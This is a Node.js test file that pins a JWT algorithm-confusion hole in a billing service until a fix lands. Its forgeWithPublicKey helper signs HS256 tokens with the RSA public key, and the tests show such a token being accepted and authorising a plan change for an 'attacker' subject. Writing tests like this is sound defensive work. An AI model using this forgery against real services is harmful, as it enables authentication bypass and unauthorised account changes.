// These assertions pin today's vulnerable behaviour and are expected to be inverted by the remediation PR.
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import test from 'node:test';
import jwt from 'jsonwebtoken';
import request from 'supertest';
import { verifyBillingToken } from '../src/auth.js';
import { createApp } from '../src/index.js';

const { publicKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
const PUBLIC_PEM = publicKey.export({ type: 'spki', format: 'pem' });

function forgeWithPublicKey(payload) {
  return jwt.sign(payload, PUBLIC_PEM, { algorithm: 'HS256' });
}

async function withPublicKey(key, fn) {
  const previous = process.env.BILLING_JWT_PUBLIC_KEY;
  process.env.BILLING_JWT_PUBLIC_KEY = key;
  try {
    return await fn();
  } finally {
    if (previous === undefined) delete process.env.BILLING_JWT_PUBLIC_KEY;
    else process.env.BILLING_JWT_PUBLIC_KEY = previous;
  }
}

test('vulnerable today: an HS256 token signed with the RSA public key is accepted', () => {
  const claims = verifyBillingToken(forgeWithPublicKey({ sub: 'attacker' }), PUBLIC_PEM);
  assert.equal(claims.sub, 'attacker');
});

test('vulnerable today: POST /plans/:id/change authorizes a token forged with the RSA public key', async () => {
  await withPublicKey(PUBLIC_PEM, async () => {
    const token = forgeWithPublicKey({ sub: 'attacker', scopes: ['plans:write'] });
    const res = await request(createApp())
      .post('/plans/team/change')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);
    assert.equal(res.body.actor, 'attacker');
  });
});
